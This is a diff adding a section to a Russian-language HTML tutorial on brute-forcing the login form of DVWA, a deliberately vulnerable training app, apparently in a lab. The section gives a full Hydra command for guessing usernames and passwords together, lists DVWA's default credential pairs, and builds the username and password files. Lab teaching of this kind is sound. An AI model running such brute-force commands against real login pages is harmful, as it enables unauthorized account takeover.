@@ -1250,6 +1250,81 @@ Cookie: PHPSESSID=023d51270ddc266b8719c2c40820602e; security=low
 То есть внешние двоеточия разделяют крупные блоки, а двоеточие после Cookie принадлежит уже содержимому третьего блока — HTTP-заголовку. Поэтому Hydra не воспринимает его как начало нового поля.
 </p>
 
+<p>
+В предыдущем примере логин был постоянным, и мы подбирали пароли. Сейчас я вам покажу способ, как подбирать и логины и пароли.
+</p>
+
+<p>
+Командная строка ниже подбирает логины и пароли.
+</p>
+
+<pre>
+
+hydra -V -L /home/kali/users.txt -P /home/kali/passwords.txt 10.0.2.3 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=c3ad85e485252b40972a14fe62651162;security=low:F=Username and/or password incorrect."
+
+</pre>
+
+<p>
+Сейчас я вам покажу все возможные логины/пароли DVWA (список ниже):
+</p>
+
+<pre>
+
+gordonb : abc123
+smithy : password
+pablo : letmein
+admin : password
+1337 : charley
+
+</pre>
+
+<p>
+Создадим отдельно файл с логинами, дадим команду: 
+</p>
+
+<p>
+nano users.txt
+</p>
+
+<p>
+Логины ниже:
+</p>
+
+<pre>
+
+gordonb
+smithy
+pablo
+admin
+1337
+
+</pre>
+
+<p>
+Создадим отдельно файл с паролями, дадим команду: 
+</p>
+
+<p>
+nano passwords.txt
+</p>
+
+<p>
+Пароли ниже:
+</p>
+
+<pre>
+
+abc123
+password
+letmein
+password
+charley
+
+</pre>
+
+<p>
+После этого можно запускать команду hydra (см.выше).
+</p>
 
 </body>
 </html>
